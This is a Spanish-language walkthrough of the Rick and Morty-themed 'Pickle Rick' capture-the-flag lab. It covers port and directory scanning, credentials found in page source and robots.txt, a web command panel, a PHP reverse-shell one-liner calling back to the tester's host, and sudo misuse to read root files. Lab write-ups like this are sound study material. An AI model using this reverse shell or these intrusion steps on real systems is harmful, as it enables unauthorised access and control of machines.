
![](https://i.imgur.com/o9pyhyU.jpg)  

This Rick and Morty-themed challenge requires you to exploit a web server and find three ingredients to help Rick make his potion and transform himself back into a human from a pickle.

## Preguntas a responder: 

-----

What is the first ingredient that Rick needs?  


What is the second ingredient in Rick’s potion?  


What is the last and final ingredient?  

-----

Empezamos con un mapeo de todos los puertos por nmap:

```bash
❯ nmap -p- --min-rate 5000 -Pn 10.10.142.14
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-14 11:34 CEST
Nmap scan report for 10.10.142.14
Host is up (0.052s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 18.16 seconds
```

Ahora hacemos un escaneo mas completo a los puertos encontrados:

```bash
❯ nmap -p22,80 -sCV -Pn 10.10.142.14
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-14 11:36 CEST
Nmap scan report for 10.10.142.14
Host is up (0.057s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c9:f6:10:24:1d:cf:07:a4:3c:1f:e3:06:7f:f4:64:8b (RSA)
|   256 b0:9d:20:7f:58:4f:ce:b5:cc:e0:8f:e2:60:05:65:3a (ECDSA)
|_  256 3d:53:81:7c:09:64:65:82:af:6a:1d:16:8c:52:02:92 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Rick is sup4r cool
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.17 seconds
```

con todo esto vamos a empezar por el servicio http y la web que aloja en el apache.

en el codigo fuente de la web vemos este body:


``` html
<body> 
	<div class="container"> 
	<div class="jumbotron"></div> 
		<h1>Help Morty!</h1></br> 
		<p>Listen Morty... I need your help, I've turned myself into a pickle   again and this time I can't change back!</p>
		</br> <p>I need you to <b>*BURRRP*</b>....Morty, logon to my computer and find the last three secret ingredients to finish my pickle-reverse potion. The only problem is, I have no idea what the <b>*BURRRRRRRRP*</b>, password was! Help Morty, Help!</p></br> 
		
		</div> 
		
		<!-- Note to self, remember username! Username: R1ckRul3s --> 

</body>
```

nos guardamos el username: R1ckRul3s

Intenté hacer un ataque de fuerza bruta con hydra al ssh pero el servicio no me dejaba por lo que continué centrándome en la web.

Buscamos el archivo robots.txt y enontramos esto:

**Wubbalubbadubdub**

hacemos una enumeración de directorios con gobuster, esta vez añadimos la flag -x para encontrar directorios con extensiones de archivo como php:

```bash
❯ gobuster dir -u http://10.10.142.14 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt,json,xml
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.142.14
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              xml,php,html,txt,json
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 277]
/.php                 (Status: 403) [Size: 277]
/index.html           (Status: 200) [Size: 1062]
/login.php            (Status: 200) [Size: 882]
/assets               (Status: 301) [Size: 313] [--> http://10.10.142.14/assets/]
/portal.php           (Status: 302) [Size: 0] [--> /login.php]
Progress: 10490 / 1323360 (0.79%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 10496 / 1323360 (0.79%)
===============================================================
Finished
===============================================================
```

accedemos a la pagina login.php, me mostro una web de logueo, probé loguearme con el usuario R1ckRul3s y la pass: Wubbalubbadubdub y entre a este panel:

![Pasted image 20240514115345.png](PanelRick.png)

aqui podemos introducir comandos a una shell, hice un -ls -la y mostró varios archivos:

```bash
total 40
drwxr-xr-x 3 root   root   4096 Feb 10  2019 .
drwxr-xr-x 3 root   root   4096 Feb 10  2019 ..
-rwxr-xr-x 1 ubuntu ubuntu   17 Feb 10  2019 Sup3rS3cretPickl3Ingred.txt
drwxrwxr-x 2 ubuntu ubuntu 4096 Feb 10  2019 assets
-rwxr-xr-x 1 ubuntu ubuntu   54 Feb 10  2019 clue.txt
-rwxr-xr-x 1 ubuntu ubuntu 1105 Feb 10  2019 denied.php
-rwxrwxrwx 1 ubuntu ubuntu 1062 Feb 10  2019 index.html
-rwxr-xr-x 1 ubuntu ubuntu 1438 Feb 10  2019 login.php
-rwxr-xr-x 1 ubuntu ubuntu 2044 Feb 10  2019 portal.php
-rwxr-xr-x 1 ubuntu ubuntu   17 Feb 10  2019 robots.txt
```
aquí podemos obtener el primer ingrediente, con un **cat Sup3rS3cretPickl3Ingred.txt** no nos deja obtener el resultado así que usé el comando less y obtenemos el primer ingrediente:
```bash
less Sup3rS3cretPickl3Ingred.txt
mr. meeseek hair
```
 la primera pregunta queda respondida : 
 
 **What is the first ingredient that Rick needs?**
 
 Respuesta: **mr. meeseek hair**

después de esto intento hacer una reverse shell para un manejo mas cómodo:
tras unas pruebas consigo que me funcione con este one-liner rev: 

**php -r '$sock=fsockopen("10.9.251.231",1234);exec("/bin/bash <&3 >&3 2>&3");'**

y obtengo acceso:
```
❯ nc -lvnp 1234
listening on [any] 1234 ...
connect to [10.9.251.231] from (UNKNOWN) [10.10.142.14] 33970
whoami
www-data

```

hago un tratamiento de la tty y empiezo con una pequeña enumeración para ver que permisos de sudo tenemos y sorpresa:

```bash
www-data@ip-10-10-142-14:/var/www/html$ sudo -l
Matching Defaults entries for www-data on ip-10-10-142-14:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ip-10-10-142-14:
    (ALL) NOPASSWD: ALL
```
tenemos permisos para todo.

vemos el archivo clue.txt que se muestra en el mismo directorio que el primer ingrediente y nos dice que sigamos buscando por el sistema.

En la carpeta de rick encontramos el segundo ingrediente:
```bash
www-data@ip-10-10-142-14:/home$ cd rick
www-data@ip-10-10-142-14:/home/rick$ ls -la
total 12
drwxrwxrwx 2 root root 4096 Feb 10  2019  .
drwxr-xr-x 4 root root 4096 Feb 10  2019  ..
-rwxrwxrwx 1 root root   13 Feb 10  2019 'second ingredients'
www-data@ip-10-10-142-14:/home/rick$ cat second\ ingredients 
1 jerry tear
www-data@ip-10-10-142-14:/home/rick$ 
```

**What is the second ingredient in Rick’s potion?**
Respuesta: **1 jerry tear**

ahora intenté entrar al directorio de root pero no me dejaba así que probé varios métodos 
```bash
www-data@ip-10-10-142-14:/$ cd root
bash: cd: root: Permission denied
www-data@ip-10-10-142-14:/$ sudo cd root
sudo: cd: command not found
www-data@ip-10-10-142-14:/$ ls root
ls: cannot open directory 'root': Permission denied
www-data@ip-10-10-142-14:/$ sudo ls root
3rd.txt  snap
www-data@ip-10-10-142-14:/$ 
www-data@ip-10-10-142-14:/$ sudo less root/3rd.txt
# y pude visualizar el tercer ingrediente

3rd ingredients: fleeb juice
```

**What is the last and final ingredient?**
Respuesta: **fleeb juice**

Con esto concluimos la maquina.